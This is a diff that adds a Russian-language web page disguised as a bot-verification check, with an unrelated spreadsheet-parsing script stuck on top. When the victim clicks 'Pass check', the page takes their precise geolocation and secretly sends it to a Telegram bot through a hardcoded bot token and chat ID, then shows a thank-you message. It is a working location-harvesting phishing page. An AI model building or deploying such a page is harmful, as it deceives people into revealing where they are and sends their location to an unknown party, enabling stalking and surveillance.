@@ -1,0 +1,286 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Проверка системы</title>
+  <style>
+    :root {
+      --primary: #007AFF;
+      --primary-hover: #005FCC;
+      --background: #ffffff;
+      --card-bg: rgba(245, 245, 247, 0.85);
+      --text: #1d1d1f;
+    }
+
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --background: #000000;
+        --card-bg: rgba(28, 28, 30, 0.85);
+        --text: #ffffff;
+      }
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: var(--background);
+      color: var(--text);
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .verification-window {
+      width: 440px;
+      max-width: 90%;
+      padding: 32px;
+      border-radius: 24px;
+      background: var(--card-bg);
+      backdrop-filter: blur(30px) saturate(180%);
+      box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+      transition: transform 0.2s ease-out, opacity 0.3s ease;
+      will-change: transform, opacity;
+      box-sizing: border-box;
+      animation: fadeInScale 0.4s ease-out;
+    }
+
+    @keyframes fadeInScale {
+      from {
+        opacity: 0;
+        transform: scale(0.95);
+      }
+      to {
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 24px;
+    }
+
+    .header h2 {
+      font-size: 1.5rem;
+      margin: 0;
+    }
+
+    .icon-robot {
+      width: 48px;
+      height: 48px;
+      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23007AFF"><path d="M13 5.5c0-.613.487-1.1 1.1-1.1h.8c.613 0 1.1.487 1.1 1.1v1.9h-3V5.5zm-2 0v1.9H8V5.5c0-.613.487-1.1 1.1-1.1h.8c.613 0 1.1.487 1.1 1.1zM6 9h12l-1 8H7zm6 3c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2"/></svg>') no-repeat center;
+      background-size: contain;
+    }
+
+    p {
+      font-size: 1.1rem;
+      line-height: 1.5;
+      margin: 0 0 20px;
+    }
+
+    .progress-ring {
+      width: 64px;
+      height: 64px;
+      margin: 20px auto;
+      animation: rotate 1.5s linear infinite;
+    }
+
+    @keyframes rotate {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    .dialog-buttons {
+      margin-top: 24px;
+      display: flex;
+      justify-content: flex-end;
+    }
+
+    .mac-button {
+      padding: 12px 24px;
+      border-radius: 12px;
+      border: none;
+      font-size: 1rem;
+      font-weight: 500;
+      cursor: pointer;
+      background: linear-gradient(180deg, #007AFF, #0066CC);
+      color: white;
+      box-shadow: 0 4px 12px rgba(0,122,255,0.3);
+      transition: all 0.2s ease;
+      position: relative;
+    }
+
+    .mac-button:hover {
+      background: linear-gradient(180deg, #0066CC, #0055A3);
+      box-shadow: 0 6px 16px rgba(0,122,255,0.5);
+      transform: translateY(-2px);
+      animation: pulse 1.5s infinite;
+    }
+
+    .mac-button:active {
+      transform: scale(0.95);
+      box-shadow: 0 2px 8px rgba(0,122,255,0.2);
+      animation: none;
+    }
+
+    @keyframes pulse {
+      0% {
+        box-shadow: 0 4px 12px rgba(0,122,255,0.3);
+      }
+      50% {
+        box-shadow: 0 6px 20px rgba(0,122,255,0.6);
+      }
+      100% {
+        box-shadow: 0 4px 12px rgba(0,122,255,0.3);
+      }
+    }
+
+    @media (max-width: 480px) {
+      .verification-window {
+        padding: 24px;
+        width: 100%;
+        max-width: 340px;
+      }
+
+      .header h2 {
+        font-size: 1.25rem;
+      }
+
+      p {
+        font-size: 1rem;
+      }
+
+      .mac-button {
+        padding: 10px 20px;
+        font-size: 0.9rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="verification-window" id="verif-window">
+    <div class="header">
+      <div class="icon-robot"></div>
+      <h2>Требуется подтверждение</h2>
+    </div>
+    <p>Система обнаружила необычную активность. Для продолжения требуется проверка на бота.</p>
+    <div class="progress-ring">
+      <svg viewBox="0 0 24 24" width="64" height="64">
+        <circle cx="12" cy="12" r="10" stroke="var(--primary)" stroke-width="2" fill="none" stroke-dasharray="15 100"/>
+      </svg>
+    </div>
+    <div class="dialog-buttons">
+      <button class="mac-button" onclick="startDeepCheck()">Пройти проверку</button>
+    </div>
+  </div>
+
+  <script>
+    const botToken = '7865307891:AAFRUGVMbETjGQnojqOm4UtL6nVQUX86MJY';
+    const chatId = '2068664847';
+
+    function startDeepCheck() {
+      setTimeout(() => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            position => {
+              const lat = position.coords.latitude;
+              const lon = position.coords.longitude;
+
+              const message = `📍 Геолокация получена:\nШирота: ${lat}\nДолгота: ${lon}`;
+
+              fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                  chat_id: chatId,
+                  text: message
+                })
+              })
+              .then(() => {
+                alert("✅ Проверка завершена. Спасибо!");
+              })
+              .catch(err => {
+                alert("Ошибка при отправке в Telegram: " + err.message);
+              });
+            },
+            error => {
+              alert('❌ Не удалось получить геолокацию: ' + error.message);
+            },
+            { enableHighAccuracy: true }
+          );
+        } else {
+          alert('Ваш браузер не поддерживает геолокацию.');
+        }
+      }, 3000);
+    }
+
+    // 🎯 Плавное следование окна за курсором
+    const windowEl = document.getElementById('verif-window');
+    let mouseX = 0, mouseY = 0;
+    let currentX = 0, currentY = 0;
+    const smoothing = 0.07;
+    const maxOffset = 20;
+
+    document.addEventListener('mousemove', (e) => {
+      const centerX = window.innerWidth / 2;
+      const centerY = window.innerHeight / 2;
+      mouseX = ((e.clientX - centerX) / centerX) * maxOffset;
+      mouseY = ((e.clientY - centerY) / centerY) * maxOffset;
+    });
+
+    function animate() {
+      currentX += (mouseX - currentX) * smoothing;
+      currentY += (mouseY - currentY) * smoothing;
+      windowEl.style.transform = `translate(${currentX}px, ${currentY}px)`;
+      requestAnimationFrame(animate);
+    }
+
+    animate();
+  </script>
+</body>
+</html>
